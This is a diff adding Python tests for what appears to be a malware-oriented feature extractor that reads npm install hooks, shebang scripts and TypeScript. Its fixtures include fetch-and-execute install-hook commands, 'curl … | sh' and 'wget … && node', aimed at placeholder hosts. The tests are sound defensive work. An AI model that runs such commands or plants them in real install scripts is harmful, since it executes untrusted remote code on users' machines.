@@ -78,6 +78,25 @@ class TestCalls:
         assert "code_import_api_this.getCredentials" in keys
 
 
+class TestShellAndTypeScript:
+    HOOK = "package.json#postinstall.sh"
+
+    def test_a_hook_command_is_words_with_every_address_masked(self) -> None:
+        keys = Fixture.features(
+            "curl -s https://zqxmarkerhost.example/zqxmarkerkey | sh", self.HOOK, "install"
+        )
+        assert any(k.startswith("code_install_tok_") for k in keys)
+        assert not any(marker in " ".join(keys) for marker in MARKERS)
+
+    def test_two_hosts_read_the_same(self) -> None:
+        one = Fixture.features("wget http://a.example/x && node x.js", self.HOOK, "install")
+        two = Fixture.features("wget http://b.example/y && node x.js", self.HOOK, "install")
+        assert one == two
+
+    def test_typescript_is_read_as_javascript(self) -> None:
+        assert "code_import_api_exec" in Fixture.features("cp.exec(cmd as string);\n", "a.ts")
+
+
 class TestBounds:
     def test_the_same_input_gives_the_same_features(self) -> None:
         assert Fixture.features(JS) == Fixture.features(JS)
@@ -119,3 +138,44 @@ class TestWhenMade:
     def test_a_measurement_run_does(self, monkeypatch: pytest.MonkeyPatch) -> None:
         monkeypatch.setenv(ReachedFlows.MEASURE, "1")
         assert "code_import_api_exec" in TestWhenMade.run()
+
+
+class TestSources:
+    @staticmethod
+    def ctx(install: frozenset[str] = frozenset(), entry: frozenset[str] = frozenset()) -> object:
+        return SimpleNamespace(
+            install_hook_paths=install,
+            install_entry_paths=frozenset(),
+            import_entry_paths=entry,
+            library_closure_paths=frozenset(),
+        )
+
+    def test_an_install_hooks_command_line_is_install_code(self) -> None:
+        manifest = b'{"name": "a", "version": "1.0.0", "scripts": {"postinstall": "node x.js"}}'
+        unit = FileUnit(content=FileContent.from_bytes("package.json", manifest))
+        got = ReachedFlows.sources([unit], TestSources.ctx(install=frozenset({"package.json"})))  # type: ignore[arg-type]
+        assert got["install"] == [("package.json#postinstall.sh", b"node x.js")]
+
+    @pytest.mark.parametrize(
+        ("head", "read_as"),
+        [
+            (b"#!/usr/bin/env node\n", "bin/tool#.js"),
+            (b"#!/usr/bin/python3\n", "bin/tool#.py"),
+            (b"#!/bin/sh\n", "bin/tool#.sh"),
+            (b"plain text\n", None),
+        ],
+    )
+    def test_an_extensionless_bin_is_read_in_its_interpreters_language(
+        self, head: bytes, read_as: str | None
+    ) -> None:
+        unit = FileUnit(content=FileContent.from_bytes("bin/tool", head + b"run()\n"))
+        got = ReachedFlows.sources([unit], TestSources.ctx(entry=frozenset({"bin/tool"})))  # type: ignore[arg-type]
+        assert [path for path, _ in got["import"]] == ([read_as] if read_as else [])
+
+    def test_a_file_past_the_size_limit_gives_its_first_bytes(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setattr(ReachedFlows, "MAX_SIZE", 8)
+        unit = FileUnit(content=FileContent.from_bytes("index.js", JS.encode()))
+        got = ReachedFlows.sources([unit], TestSources.ctx(entry=frozenset({"index.js"})))  # type: ignore[arg-type]
+        assert got["import"] == [("index.js", JS.encode())]
